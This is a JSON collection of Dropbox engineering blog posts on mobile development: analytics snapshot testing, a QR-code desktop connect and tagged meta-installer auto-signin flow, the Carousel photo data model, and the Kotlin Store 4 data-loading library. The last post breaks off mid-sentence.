[
{"website": "Dropbox", "title": "How we ensure credible analytics on Dropbox mobile apps", "author": ["Marianna Budnikova"], "link": "https://dropbox.tech/mobile/how-we-ensure-credible-analytics-on-dropbox-mobile-apps", "abstract": "Our approach Results Adding user analytics to a feature may seem like a straightforward task: add events to all the appropriate call sites, pass the event names to product analysts who will use the events for their investigations, and voilà —you have analytics for your feature! In reality, the user analytics story is a lot more complicated. When creating new features, engineers rarely think about analytics and how they will measure the success of the new feature. Feature analytics are often added at the last minute by request of the business stakeholders. Exact details of what analytics are needed and what type of insights the data should be used for are often not specified. As a last-minute addition, the analytics code tends to be poorly-designed and not well-tested. After the initial launch of the feature, analytics often become forgotten and unobserved, and with continued development of new features without the sufficient code coverage, the old analytics becomes untrustworthy. It would almost be better to not have any analytics at all than make decisions on faulty data! My team at Dropbox recently invested in ensuring the integrity of our analytics. We wanted to share what we learned and what we would have done differently. Our approach Together with product analysts and product managers, we came up with three pillars of credible and useful analytics: Intentional: analytics should answer real business questions that measure feature success important to stakeholders Credible: analytics should be well-tested to prevent degradation Discoverable: analytics should be easy to find, understand, and use by business stakeholders Intentional data: Data as a feature success indicator Oftentimes as engineers we do not meaningfully engage with product managers and product analysts to understand the questions they are trying to answer. We simply turn their request to “add analytics here” into a JIRA ticket, then into a pull request, then finally wash our hands of the entire process. This leads to messy analytics code being put in last minute and without much thought. What is worse, without a clear structure and guidance on how to intentionally add analytics, we may end up accidentally measuring the wrong things. To ensure the events that we log are intentional, engineers must play a more active role in how analytics get added to our codebases. We should ask ourselves, why are we adding feature analytics in the first place? The answer is, to measure the success of the feature, of course! So how do we measure success? We ask our product analysts and product managers to come up with business questions they want to answer. As an example, these are some of the questions we use to measure photo upload feature success on mobile apps: How long does it take to upload a photo? What is the upload completion rate? How many of our mobile users are uploading photos? What is the week-over-week retention rate for photo uploads? We then can design and instrument analytics directly to answer these questions. We also significantly speed up the implementation and testing of analytics. Credible data: data as code Product analysts are interested in answering questions involving complex user scenarios spanning multiple screens and user interactions. As developers, we write tests to validate that our code behaves as expected. However, since unit tests are designed to test the smallest unit of code, they cannot be used to ensure analytics are being captured properly as a user moves throughout the app. To test user flows throughout the app, we employ our instrumented UI test infrastructure. In a UI test, we simulate users going through complex workflows in our mobile app and capture the analytics events for those workflows. These analytics events are then serialized into JSON format and compared against an expected output. Comparing complex outputs saved to a text file is called snapshot testing , or textual snapshot testing . The main idea behind textual snapshot testing is that the expected output gets stored in a text file and when the test runs, a new output is generated. The new output is then compared against the expected one. If the outputs match, the test passes, otherwise the test fails with an error showing the difference between the two outputs. Snapshot testing is not a new concept and has been widely applied in web development. React’s Jest framework leverages snapshot testing to test UI component structure without actually rendering any UI. Let’s look at a snapshot test example. Here is an instrumented test that tests the photo upload scenario in our Android app: Copy @get:Rule\r\nval snapshotTestRule = SnapshotRule.Creator().create()\r\n\r\n@Test\r\n@ExpectedSnapshot(R.raw.test_upload_image)\r\nfun testUploadImage() {\r\n    uploadPhotoButton.click()\r\n    uploadPhoto(\"test_photo.jpg\")\r\n    waitUntilSuccessfulUpload()\r\n\r\n    snapshotTestRule.verifySnapshot()\r\n} In this test, we instrument a user scenario where a user clicks on an upload button, chooses a file to upload, and waits until the upload finishes successfully. While the test is running, it collects analytics events of interest as defined in our test rule. Copy @get:Rule\r\nval snapshotTestRule = SnapshotRule.Creator()\r\n    .metricsToVerify(\r\n        \"upload_button.clicked\"\r\n        \"upload.success\",\r\n        \"upload.start\"\r\n    )\r\n    .attributesToVerify(\r\n        \"extension\"\r\n    )\r\n    .create() After the last user scenario instrumentation call, we run verifySnapshot . This verifies that the recorded events match the expected textual snapshot. The expected snapshot is a raw resource that we refer to in the test header. Below is what the contents of the test_upload_image snapshot file look like: Copy [\r\n      {\r\n        \"event\": \"upload_button.clicked\"\r\n      },\r\n      {\r\n        \"event\": \"upload.start\",\r\n        \"extension\": \"jpg\"\r\n      },\r\n      {\r\n        \"event\": \"upload.success\",\r\n        \"extension\": \"jpg\",\r\n        \"total_time_ms\": \"EXCLUDED_FOR_SNAPSHOT_TEST\"\r\n      }\r\n    ] In the example above, note the presence of the EXCLUDED_FOR_SNAPSHOT_TEST value. Some of the fields we record for analytics events are not idempotent and will be different each time the code is run since we are not mocking the majority of the systems in the UI test. For non-idempotent fields, we chose to not test the recorded value and instead ensure the presence of the field. This way, if field tagging for the event is changed or removed in the future, the snapshot test will catch it. Discoverable data: anyone can gain insight from data With user analytics added, verified, and put under test, the next step is to make the insights gathered from analytics accessible to the team and stakeholders. On the Mobile team, we have dashboards dedicated to each core Dropbox feature with graphs answering questions about the feature use (e.g. How long does it take for the Home screen to load? ). The data would be useless if it does not get used and monitored consistently. At Dropbox Mobile, we have a combination of monitoring for data anomalies as well as manual dashboard reviews by analysts and oncall engineers. The specifics of how and what tools to use when sharing data will be different for each company. The important thing to remember here is that after defining a bunch of questions to answer with our data we can now finally get answers and monitor insights over time! Results The process of making analytics intentional, credible, and discoverable can be applied to analytics for completely new features and existing features. Here are a couple of examples how this work helped ensure credible analytics for our mobile apps: We discovered that some of our existing analytics were double logged. For example, when the user clicked on some of the navigation buttons, we noticed that the logging event was being fired twice. We fixed the issues, and by creating snapshot tests for navigating through the app, made sure that the core navigation analytics stay credible. We learned that some of the analytics we thought we were recording correctly turned out to be unusable by our stakeholders. For example, when the app sign in failed, we logged the localized error message shown to the user in a dialog. Since Dropbox is translated into 22 languages and there are many possible sign in failures, it is very difficult to visualize the breakdown of sign in error reasons without a lot of work mapping the translated error messages to unified error types. To fix the logging, we used an enum representing various error states (for example, GOOGLE_AUTH_FAIL ). By changing the logging to consistent enums, we can now easily visualize the sign in error breakdown, and enable focusing on most impactful user sign in errors. As we invest in rearchitecting some of our code, for example, deprecating some of the legacy C++ into native code , snapshot tests will ensure that the feature analytics do not degrade during the migration. Overall we are incredibly satisfied with the impact of our investment to ensure integrity of Dropbox mobile analytics. We perform biweekly releases for our Mobile apps at Dropbox, so getting the data right on the first go is crucial. If we make a mistake in logging the data, we have to wait for two weeks to fix it. By engaging early and often with our product and analyst counterparts, we can more fully understand the value of our analytics. By knowing the questions we are trying to answer we can more meaningfully and thoughtfully add analytics code to our codebases. Lastly, by snapshot testing the events and fields for our analytics we can ensure the accuracy of our data. Thanks to Alison Wyllie, Amanda Adams, Angella Derington, Anthony Kosner, Mike Nakhimovich, and Sarah Tappon for comments and review.  And thanks to Zhaoze Zhou and Angella Derington for helping make mobile analytics healthy and happy. // Tags Mobile analytics Testing Code quality // Copy link Link copied Link copied", "date": "2020-07-15"},
{"website": "Dropbox", "title": "The Tech Behind Dropbox’s New User Experience on Mobile (Part 2)", "author": ["Viraj Mody"], "link": "https://dropbox.tech/mobile/the-tech-behind-dropbox-s-new-user-experience-on-mobile--part-2-", "abstract": "How desktop connect works How the meta-installer and auto-signin work In last week’s post , Kat described how we redesigned our new user experience from the ground up to make it a delight for users to get started on Dropbox from our mobile apps. In this post, I’ll go into more detail about everything we did to make the mobile-to-desktop transition simple for users. To recap the previous post, here’s a summary of the flow: The desktop connect flow allows users to log in to the website with only their phone, without typing in credentials, and initiates a download. The “meta-installer” downloads quickly because of its small file size. When launched, it sets up permissions for Dropbox, starts downloading the full installer, and completes installation automatically. When Dropbox is fully installed, the server, browser, and desktop client work together to validate the client and allow it to safely log the user in without requiring the user to enter their email and password again. How desktop connect works The desktop connect flow begins on the phone. It instructs the user to go to dropbox.com/connect on their computer (we added a picture of a computer too, just to make things extra clear). Our goal in this flow is to get the user set up with Dropbox on their desktop, minimizing any risk of losing them along the way. Trying to go to the connect website from the phone’s browser is one possible failure mode. On our servers, we generate a QR code with a unique token and display it on the website. To make the flow more fun, we display the QR codes inside a Dropbox. Here’s what the background image looks like . We place identical copies of the QR codes (embedded as inline images with data urls) in each of the empty boxes. When the user taps ‘Next’ on their phone, a camera appears with instructions to point it at the computer. The phone auto-focuses and captures the QR code. It knows to ignore any QR codes not generated by Dropbox. Once it successfully captures the QR code, it extracts the unique token and communicates it to the server, along with the user ID of the user currently signed in on the phone. The browser, meanwhile, is polling the server for new information about the unique token. When the server hears from the phone, it can tell the browser that the QR code’s unique token is now associated with a user. The browser then authenticates the users and logs them in, without requiring their username or password at all. To convey that this transition has occurred, the browser greets the user by name: The browser immediately starts downloading the meta-installer. The full Dropbox installer is huge—it’s about 35MB. The Dropbox client that runs on Windows, Mac OS, and Linux is built using Python, so the installer includes the entire (slightly modified) Python runtime that must be installed on every machine in order for Dropbox to run successfully. With such long download times, users can get distracted easily and totally forget about Dropbox by the time the installer finishes downloading. To solve this problem, we created what we call the ‘meta-installer.’ The meta-installer is a very small executable that’s just a placeholder to grab the full installer from a CDN. This executable preps the machine for installation (it handles acquiring permissions to complete the install, for instance) while it fetches the payload from the server in parallel. The meta-installer has another huge advantage. One big problem for us on the product/engineering teams was that we had almost no insight into what was going on for a particular user after they initiated the download. Did the user launch the installer? Did the user’s installation complete successfully, or did it fail at a particular spot? How did this behavior differ with speed of internet connections? Which download route was the most successful, and which wasn’t? One of the keys to solving this problem was to be able to generate some kind of token that helps us associate an instance of a download with the installation, embed it in the installer, and trace it through the funnel. The meta-installer gave us an opportunity to do this. Because it’s such a small download, we can serve it ourselves instead of through a CDN. We can choose to serve a unique binary for every request. We tag the meta-installer with an ID while the larger full installer is still a static resource that we can host on a CDN. How the meta-installer and auto-signin work To generate the meta-installer, we start with a standard template installer binary that contains a 1K buffer (known as the tag buffer) somewhere in the binary. The exact location (and implementation) is platform-specific. For every installer request, we clone the template, generate a token, and then replace the empty tag buffer with this token. There was another interesting challenge here, though. Modern OSes require that each binary is signed by the publisher. The template installer was signed using Dropbox’s key, but modifying it with the token would invalidate the signature. One option to fix this was to defer signing the installer until the point where we had embedded the token, but that posed some performance problems. Instead, we created a custom version of the signing tools which complied with the Authenticode spec (for Windows) while letting us safely modify content for each binary. Our custom tool allows us to create an unverified section of the binary in a way that is compliant with the Authenticode spec. We make the tag buffer an unverified section so that the tag buffer can change without having to re-sign the binary. So finally when the full installer runs, it knows where to look for the token in the tag buffer. It can use the token to report progress or report any failures along the way. This enables us to get a holistic view into user behavior and issues in Dropbox’s install funnel. At this point, the Dropbox desktop client is running on a user’s machine. However, there’s still a lot of room for failure. Users might be busy with other applications and forget to log in. Some might have forgotten their username or password. They may not feel like looking it up, changing it, or just typing it in. To fix this, we leveraged our solution to the meta-installer tagging problem above to create a secure means of authenticating the user on the desktop client using their credentials from the web session. The meta-installer solution above enables us to embed arbitrary tokens in the 1k tag buffer, so we embedded a token affiliated with the user’s identity. When the user installs and runs the desktop client, the client can look at that buffer and use the token to log in as the user automatically. Of course, we needed to address security aspects for this solution to be broadly deployed. For instance, user A shouldn’t be able to download an installer, send it to user B, and have user B’s computer linked to user A’s account. Similarly, user X should not be able to generate arbitrary links that can trick user Y into downloading an installer that links their machine to user X’s account. We needed to be conservative and follow smart heuristics to determine when not to automatically sign in a user and fall back to requiring an email and password. In order to solve these and some other security concerns, we leveraged the tag buffer, browser cookies, and a client-side nonce. The browser, desktop client, and server work together to verify the user’s identify. It works like this: The server generates a meta-installer that is tagged with two bits of information: a new, unique, one-time user token that identifies the logged in user and the browser that was used to download the installer. The token is associated with a user, can only ever be used to link a computer once, and is valid for a small time window. When the installer runs, it pings the server with the user token to check whether the token is still valid and unused, and sends over a client-generated nonce. The server now associates the client nonce and the user token with each other. After Dropbox is installed, it launches the same browser that was used to initiate the download (remember, we embedded this information in the meta-installer) and directs the user to a page on www.dropbox.com with the user token and the client nonce. This page has some security restrictions in place to make sure it wasn’t embedded in an iframe or linked to by another site. The page POSTs the user’s token and nonce to the server over SSL. The server cross checks the token and nonce provided with the user’s cookie. The token must be valid, unused, and must be linked to the same user as the one identified by the browser’s cookie. If everything looks good, the server instructs the Dropbox desktop client to log in as the user, and everything appears magical. By leveraging the browser cookie, we ensure that the desktop client only logs in if the same user who downloaded it is logged in on the browser for that particular machine. You can’t force somebody else to log in to your Dropbox by sending them your binary. Browser tag validation and cross-checking it with the client nonce helps prevent attacks where the flow is interrupted and continued on another device. We also have a few other security and reporting measures implemented to ensure that things work smoothly. If any of our conditions isn’t met, we abort auto sign-in and ask the user to log in with an email and password. Additionally, for users who have enabled 2-factor authentication or use SSO to log in, we don’t do auto sign-in. By the end of this flow, the user has a fully functioning, logged in, and ready-to-use desktop version of Dropbox up and running. They never had to type in their email or password. Even though there’s a lot going on behind the scenes, to the user everything appears so smooth that it’s expected. When we first tested this flow in user studies, almost nobody noticed that anything unusual had happened. That’s when we felt we had done our job well. To the user, it just works. The flow is now live for Android, iOS, Mac, and Windows. If you’re excited about building product-driven technology, come join us! // Tags Mobile // Copy link Link copied Link copied", "date": "2014-08-20"},
{"website": "Dropbox", "title": "Building Carousel, Part II: Speeding Up the Data Model", "author": ["Drew Haven"], "link": "https://dropbox.tech/mobile/building-carousel-part-ii-speeding-up-the-data-model", "abstract": "Data loading in smaller data sets Accumulator model Metadata snapshots Speedy snapshots Coming next in “Building Carousel” In the last post, Stephen explored the asynchronous client-server communication model we use in Carousel to provide a fast user experience, where interactions aren’t blocked on network calls. But network latency was not our only hurdle. In order to make the app feel fast and responsive, we also needed to minimize user-visible disk latency. One of Carousel’s primary goals was to make all of the user’s photos and videos accessible in one continuous view. We have users with over 100,000 photos in Dropbox, and we needed to build a metadata-loading pipeline that could accommodate them. This meant building a metadata-loading system that can show photos on-screen within a second of opening the app and provides smooth scrolling even as the user navigates back in time through their entire history of photos. Simply reading the metadata off of disk is too slow to do on demand while scrolling, so we keep a model of the user’s photo metadata in memory that reflects the metadata we have in our cache on disk. Keeping the in-memory model correct with respect to the on-disk model is tricky because there are many threads that want to modify the state of the model concurrently: the thread receiving file changes from the server, the main thread with interactions from the user, and various background tasks like uploading pictures. Furthermore, we can’t read all of a user’s metadata off of disk immediately on app startup because it would block the user from seeing their photos for far too long. For example, on a modern Android smartphone (Nexus 5) with about 300 bytes of metadata per photo, it takes a full second to read metadata for a mere 5,000 photos out of SQLite. Data loading in smaller data sets Before we look at Carousel’s in-memory model, let us take a moment to consider common practices of loading and caching data to display. On Android, this is typically done with Loaders and Cursors . For the photos tab on our Dropbox mobile app, we store photo metadata in SQLite and then retrieve it using a SQLiteCursor which wraps a query to SQLite. This has a few problems because the Cursor interface doesn’t mesh well with the interface SQLite exposes. SQLite is a single-threaded library, so to read the results of a SQLite query in C, one needs to execute a query and step through the result rows all while holding a lock on the database connection. But the Cursor interface allows for later access to the query result, so what SQLiteCursor does is that the Java object runs the SQL query lazily, caching a fixed amount of query results at a time ( 2MB by default ). There are quite a few drawbacks here, especially if you have to deal with more than 2MB of data. First, the Cursor grabs the next page of data by rerunning the query with an OFFSET clause. If the data set changed between the first time the query was run and the second, it might miss returning some rows. Second, it’s easy to miss the fact that the query is run the first time the Cursor needs data (generally during the first call to moveToFirst or getCount), which might be on the main thread. Even if you work around this while preparing the query by forcing the query to run on a background thread, a second run of the query will be whenever you advance past the first 2MB, which is also likely to be on the main thread. A disk read of 2MB on the main thread can cause a several-second hang. On iOS, although we get to interface directly with SQLite, we have similar problems because the naive implementation is to load data with a single SQL query, generally with a limit to the number of rows returned. When we built our original iOS and Android apps, we chose to work around these issues by paginating the photos tab, choosing a page size of approximately 5,000 photos where the latency to do a blocking disk read of a page of metadata is “tolerable”. Accumulator model In Carousel, we wanted to fix the experience for users with more than a single page of photos by using a different model for loading photo metadata off of disk. When it comes time to render the view to the user, it doesn’t matter how we store the user’s data on disk as long as we can quickly bind data to the view. We prepare an in-memory “view model”, a data structure that provides exactly this: an index on our metadata that is fast enough to query on the UI thread at render time. We use the view model to implement UI callbacks like iOS’s cellForRowAtIndexPath: and Android’s Adapter.getView() . Because the way we access this data structure is similar between iOS and Android, we can actually share this view model between the two platforms, implementing the logic only once in C++. Having a large data model in C++ rather than in Java also helps us avoid stuttering app behavior on Android due to large garbage collections. While we won’t go into depth on cross-platform mobile development with C++ here, we plan to write about this more in a future blog post. There were several performance characteristics we needed to be careful about in implementing this view model. First, it needed to be fast to update. Whenever a new photo gets added to the user’s Dropbox remotely on the server, perhaps because they added it from their computer, we need to be able to reflect that update quickly, without reloading the entire data set. Second, we also need to be able to load the initial view of Carousel without blocking on a full read of the metadata on disk. Both of these requirements drove us toward an interface that would allow for incremental updates, which is why we call our in-memory data model an “accumulator”. The accumulator prepares the view model to pass off to the UI whenever changes happen with the user’s data. The model that our timeline view uses has a fairly simple transactional interface: Copy class EventsAccumulator {\r\npublic:\r\n  virtual ~EventsAccumulator() {}\r\n \r\n  virtual void add_photo(const string & photo_id,\r\n                         const PhotoMetadata & photo_metadata) = 0;\r\n  virtual void remove_photo(const string & photo_id) = 0;\r\n  virtual void add_event(const string & event_id,\r\n                         const EventMetadata & event_metadata,\r\n                         const vector & photo_ids) = 0;\r\n  virtual void remove_event(const string & event_id) = 0;\r\n  virtual void commit() = 0;\r\n}; In one transaction, we add a batch of photos and their corresponding events, then finish by calling commit. At the end of commit, the accumulator might not have all the photos in a user’s collection because we’re still streaming metadata from the server or out of our on-disk SQLite cache, but we’re guaranteed to have a consistent data model where the photos that do appear are in the events we intend for them to be in. With this interface in place, we’ve been able to develop and optimize our database transactions without adding much complexity to the higher application layer. We make use of this interface by adding photos in a few places: when the app is first launched, to load cached metadata out of SQLite and into memory when we download new metadata from the server when our camera roll detector finds new photos that need to be backed up These three code paths happen on separate threads, so we need to avoid having two threads with open EventsAccumulator transactions at the same time. Each thread locks the EventsAccumulator during a transaction, but it only has to spend that time pushing in-memory metadata into the accumulator. For example, the sync thread looks roughly like this, using calls to a server API like our /delta : Copy while (/*delta has more*/) {\r\n  Json response = call_server_delta();\r\n  vector events;\r\n  vector photos;\r\n  std::tie(events, photos) = parse_delta(response);\r\n  write_delta_to_disk(events, photos);\r\n  /*with accumulator lock*/ {\r\n    for (const ParsedEvent & event : events) {\r\n      accumulator->add_event(event.id, event.metadata, event.photo_ids);\r\n    }\r\n    for (const ParsedPhoto & photo : photos) {\r\n      accumulator->add_photo(photo.id, photo.metadata);\r\n    }\r\n    accumulator->commit();\r\n  }\r\n} This thread can perform the time-intensive tasks of making the network call and parsing the returned json before it tries to grab the accumulator lock, allowing the thread that's reading metadata off of disk proceed unblocked. Of course, we still have to coordinate on accesses to disk between these two threads to give the app a consistent view of the data. The thread that's reading data out of SQLite takes a lock on the database while it reads a batch of metadata that prevents us from executing write_delta_to_disk on the sync thread at the same time. Metadata snapshots With these threads running to populate the accumulator, the data that the UI needs to display can be changing very frequently. To give the UI code control over when the data can change during its calculations, we present the UI with an immutable snapshot of the data model every time we call commit . One reason why we care about using snapshots is so that the UI can perform an atomic swap of models to refresh its data. There are generally two major ways UI frameworks will support updating the data backing the UI: swap the entire view model for a new model apply incremental updates to the current view model Android primarily uses the first pattern, while iOS generally uses the second. Incremental updates have an advantage in that they allow for animating changes to the data model (i.e. animating insertions and deletions). But they're not strictly necessary, and one can derive them by taking diffs between snapshots. Our shared code prepares snapshots of the view model that support the first pattern. The snapshots allow looking up photos by absolute position in the ordering of all photos and by (event_index, index_within_event) pairs (iOS developers will recognize this pair as NSIndexPath in disguise). When we get a new snapshot, on iOS we call [UITableView reloadData:] to swap the new view model for the old. On Android, we wrap the snapshot with a thin layer that calculates the row index of each event and use it as the data source for our ListAdapter . Speedy snapshots An immutable data structure gives good logical properties to someone using it, but often worse performance than its mutable counterpart depending on how it's implemented. In the simplest implementation, when we'd like to change an item, we would have to make a copy of the entire immutable data structure with that single item changed. Our first, naive implementation of a snapshot of all the photo metadata was a sorted array of all the photos in the timeline. Say a user with 50,000 photos hides a photo in their timeline; making a copy of the entire photo metadata array and re-sorting it (a guard for the more general case of photos changing events) takes us almost a second! That's a terrible user experience. To remove this latency, we improved the performance of these immutable snapshots dramatically by changing up the structure so we could take fast, shallow copies. Taking advantage of the fact that we group our photos into events and that changes tend to happen to photos in a handful of events at once, we changed the structure of metadata snapshots from a single array of photos to an array of events with pointers to arrays of photos in each of them. To make a copy of this snapshot with a single event changed, we only have to make a deep copy of the single changed event and then copy pointers to other events that keep their own arrays of photos. This scheme gets a bit more complicated because our snapshots also cache information to make various lookups faster, but having the ability to make fast, shallow copies remains the core idea. We expose an interface for looking up a photo by absolute position in the entire snapshot; this is implemented by keeping the offsets of the beginnings of the events into the full list, then doing a binary search over these to find in which event a photo index lands. Here are the offsets for the earlier example: And here they are after a photo gets added: Coming next in “Building Carousel” This accumulator and snapshot design works best because we can hold a user's view model with metadata for all of their photos in memory. We can't hold all of the user's photos in memory at the same time, though, so we have a different solution designed to keep a window of the thumbnails in memory at any given time, fetching them around where the user is looking. There are also more parts of the UI layer that we've optimized between the snapshot model and the end result users see. For example, the layout for showing users' metadata and photos in conversations is also significantly different from the events view. We'll dive into more details on these topics in future blog posts. // Tags Mobile Ios Photos Android Data Model // Copy link Link copied Link copied", "date": "2014-08-06"},
{"website": "Dropbox", "title": "Store grand re-opening: loading Android data with coroutines", "author": ["Mike Nakhimovich"], "link": "https://dropbox.tech/mobile/store-grand-re-opening-loading-android-data-with-coroutines", "abstract": "What problem is Store trying to solve? What is a Store? Wrapping Up Many moons ago, I was working at the New York Times and created a library called Store , which was “a Java library for effortless, reactive data loading.” We built Store using RxJava and patterns adopted from Guava’s Cache implementatio n . Today’s app users expect data updates to flow in and out of the UI without having to do things like pulling to refresh or navigating back and forth between screens. Reactive front ends led me to think of how we can have declarative data stores with simple APIs that abstract complex features like multi-request throttling and disk caching that are needed in modern mobile applications. Fast forward three years, Store has 45 contributors and more than 3,500 stars on Github. Today, I am delighted to announce Dropbox will be taking over active development of Store and releasing it in 100% Kotlin backed by Coroutines and Flow. Store 4 is an opportunity to take what we learned while rethinking the api and current needs of the Android ecosystem. Android has come a long way in the last few years. The pattern of putting networking code in Activities and Fragments is a thing of the past. Instead, the community is increasingly converging on new, useful libraries from Google. These libraries, combined with architecture documentation and suggestions, now form the foundation of modern Android development. As an example, here’s Android Jetpack’s guide to Android architecture: It’s one thing to provide docs for patterns but the Android Jetpack team has gone further and actually provided implementations for us: Fragments and Activities: These have always been around, but now have AndroidX versions with things like Lifecycle and Scopes for coroutines. Fragments and Activities give us what we need to build the view layer of our app. View Model and Live Data: These help us transmit data that we get from repositories without needing to manage rotation and lifecycle ourselves (Wow, we’ve come a long way!) Room: Takes the complexities out of working with SQLite by providing us a full-fledged ORM with RxJava and coroutines support. Remote Data Source: While not a part of Jetpack, Square’s Retrofit and Okhttp have solved network access in two different levels of abstraction. Careful readers may have noticed that I skipped over Repository (not just me, it seems like Jetpack team also skipped it 😉 ). Repository currently only has a few code samples and no reusable abstractions that work across different implementations. That’s one of the big reasons why Dropbox is investing in Store— to solve this gap in the architecture model above. Before diving into Store’s implementation, let’s review the definition of a repository. Microsoft offers a nice definition, describing repositories as: “classes or components that encapsulate the logic required to access data sources . They centralize common data access functionality, providing better maintainability and decoupling the infrastructure or technology used to access databases from the domain model layer.” Repositories allow us to work with data in a declarative way. When you declare a repository, you define how to fetch data, how to cache it, and what you will use to transmit it. Clients can then declare request objects for the pieces of data they care about, and the repository handles the rest. What problem is Store trying to solve? Four years ago, when we before we began working on Store , preventing complex Android apps from using large amounts of data was a struggle. It was a significant engineering challenge to figure out how to keep network usage low while maintaining always-on connectivity. Most companies opted for always-on connectivity to ensure the best user experience. Unfortunately, most users’ cell phone bills scale with the amount of data used, so this approach was more expensive for users. With that in mind, it was important for apps to find ways to keep data usage to a minimum. We created Store in part, to address this problem and make it easy for engineers to keep data usage low. A major contributor to this problem of large data usage was duplicate requests for the same data. A common example… Here’s how the original version of Store solved the problem: Sharing with Store As you can see above, having a repository abstraction like Store gives you a centralized place to manage your requests and responses, allowing you to multicast both loading, error, and data responses rather than doing the same work many times. Fast forward 4 years and the world of Android has changed at breakneck speed. Previously, we were working with network and databases that returned scalar values. Now, with the release of Room and SQLDelight, applications can subscribe for changes to data that they require. Similarly, websockets, push libraries like F irebase , and other “live” network sources are becoming more prevalent. Originally, Store was not written to handle these new observable data sources, but given their new prevalence we decided it was time for a rewrite. After much collaboration and many late nights, we’re pleased to introduce the fourth version of Store: github.com/dropbox/Store . Store 4 is completely written in Kotlin. We also replaced RxJava with Kotlin’s newly-stable, reactive streams implementation called Flow. You might be asking, Why ditch an industry leader like RxJava? First and most importantly is the concept of structured concurrency. Structured concurrency means defining the scope or context where background operations will run before making a request rather than after. This matters because the way scoping of background work is handled has a huge impact on avoiding memory leaks. Requiring scope to be defined at the beginning of the background work ensures that when that work is complete or no longer needed, the resources are guaranteed to be cleaned up. Structured concurrency is not the only way to define the scope of background work. RxJava solves the same problem in a different way. Let’s look at RxJava’s core API for defining the scope of background work: Copy // Observable.java \r\n@CheckReturnValue \r\npublic final Disposable subscribe(Consumer onNext) {} Notice in the method signature above, RxJava Observable will return a disposable as the handle of the subscription. The disposable has a function dispose which tells the upstream observable to detach the consumer from itself. The scope background operation is defined between the start of the subscription and the call to this dispose method. Recently, RxJava2 added @CheckReturnValue, an annotation to denote that a call to flowable.subscribe will return a value and a user should retain it to use for future cancellation. Unfortunately, this is only a lint warning and will not prevent compilation. Think of it as RxJava warning you not to leak. The big problem with RxJava’s approach to scoping background operations is that it’s too easy for engineers to forget to call dispose . Failing to dispose of active subscriptions directly leads to memory leaks. Unlike RxJava, which lets you first start an observable and then reminds you to handle the cancellation or detachment later, Kotlin Flow forces you to define when observables should be disposed right when you create the data source. This is because Flow is implemented to respect structured concurrency. Let’s take a look at Flow and how it prevents leaks. Copy suspend fun Flow.collect(...) Collect is similar to subscribe in RxJava, it takes a consumer that gets called with each emissions from the flow. Unlike RxJava, Flow's collect function is marked with suspend. This means that it is a suspending function (think async/await) which can only be called inside a coroutine. This forces Flow.collect to be called inside a coroutine guaranteeing that Flows will have a well-defined scope. While this seems like a small distinction, in the world of Android (an embedded system with limited memory resources) having better contracts for scoping async work leads directly to fewer memory leaks, improving performance and reducing risk of crashes. Now, with structured concurrency from Kotlin coroutines, we can use things like Jetpack's viewModelScope, which auto-cancels our running flow when the view model is cleared. This cleanly solves a core problem faced by all Android applications: how to determine when resources from background tasks are no longer needed. Copy public fun CoroutineScope.launch(...)\r\n  \r\n   viewModelScope.launch {\r\n       flow.collect{ handle(it) \r\n    }\r\n} Structured concurrency was the biggest reason why we switched to Flow. Our next biggest reason to switch was to align ourselves with the direction of the broader Android community. We’ve already seen that AndroidX loves Kotlin and Coroutines. Many libraries like ViewModel already support coroutine scopes, Room has first-class Flow support. There is even talk of new libraries that are being converted to use coroutines as an async primitive ( Paging ). It was important to us to rewrite Store in a manner that aligns with the Android ecosytem, for not just today but many years to come. Lastly, while we do not have current plans to use Store for anything but Android, we felt that the future may include Kotlin multi-platform as a target and wanted to have as few dependencies as possible. RxJava is not compatible with Kotlin native/js and pulls in 6,000+ functions). What is a Store? A Store is responsible for managing a particular data request. When you create an implementation of a Store, you provide it with a Fetcher which is a function that defines how data will be fetched over the network. Optionally, you declare how your Store will cache data in-memory and on-disk. Since Store returns your data as a Flow, threading is a breeze! Once a Store is built, it handles the logic around your data fetching/sharing/caching, allowing your views to use the most up-to-date data source and ensuring that data is always available for offline use. Fully Configured Store Let's start by looking at what a fully configured Store looks like. We will then walk through simpler examples showing each piece: Copy StoreBuilder.fromNonFlow { api.fetchSubreddit(it, \"10\")}\r\n            .persister(\r\n              reader = db.postDao()::loadPosts,\r\n              writer = db.postDao()::insertPosts,\r\n              delete = db.postDao()::clearFeed)\r\n            .cachePolicy(MemoryPolicy)\r\n            .build() The above builder is declaring: In-memory caching for rotation Disk caching for when users are offline Rich API to ask for data whether you want cached, new, or a stream of future data updates. Store additionally leverages duplicate request throttling to prevent excessive calls to the network and allows the disk-cache to be used as a source of truth. The disk-cache implementation is passed through the persister() builder function and can be used to modify the disk directly without going through Store. Source of truth implementations work best with databases that can provide observable sources like Jetpack Room, SQLDelight, or Realm. And now for the details: Creating a Store You create a Store using a builder. The only requirement is to include a function that returns a Flow or a suspend function that returns a ReturnType. Copy val store = StoreBuilder.from {\r\n                articleId -> api.getArticle(articleId) //Flow<Article>\r\n            }\r\n            .build() Store uses generic keys as identifiers for data. A key can be any value object that properly implements toString(), equals() and hashCode(). It will be passed to your Fetcher function when it is called. Similarly, the key will be used as a primary identifier within caches. We highly recommend using built-in types that implement equals and hashcode or Kotlin data classes for complex keys. Public Interface: Stream The primary public API provided by a Store instance is the stream function which has the signature: Copy fun stream(request: StoreRequest<Key>): Flow<StoreResponse>Output>> Each stream call receives a StoreRequest object, which defines which key to fetch and which data sources to utilize. The response is a Flow of StoreResponse . StoreResponse is a Kotlin sealed class that can be either a Loading , Data , or Error instance. Each StoreResponse includes a ResponseOrigin field which specifies where the event is coming from. The Loading class only has an origin field. This can be a good signal to activate the loading spinner in your UI. The Data class has a value field which includes an instance of the type returned by Store. The Error class includes an error field that contain the exception thrown by the given origin. When an error occurs, Store does not throw an exception, instead, it wraps it in a StoreResponse.Error type which allows Flow to not break the stream and still receive updates that might be triggered by either changes in your data source or subsequent fetch operations. This allows you to have truly reactive UIs where your render/updateUI function is a sink for your flow without ever having to restart the flow after an error is thrown. See example below: Copy lifecycleScope.launchWhenStarted {\r\n  store.stream(StoreRequest.cached(key = key, refresh=true)).collect { response ->\r\n    when(response) {\r\n        is StoreResponse.Loading -> showLoadingSpinner()\r\n        is StoreResponse.Data -> {\r\n            if (response.origin == ResponseOrigin.Fetcher) hideLoadingSpinner()\r\n            updateUI(response.value)\r\n        }\r\n        is StoreResponse.Error -> {\r\n            if (response.origin == ResponseOrigin.Fetcher) hideLoadingSpinner()\r\n            showError(response.error)\r\n        }\r\n    }\r\n  }\r\n} For convenience, there are Store.get(key), Store.stream(key) and Store.fetch(key) extension functions. suspend fun Store.get(key: Key): Value This method returns a single value for the given 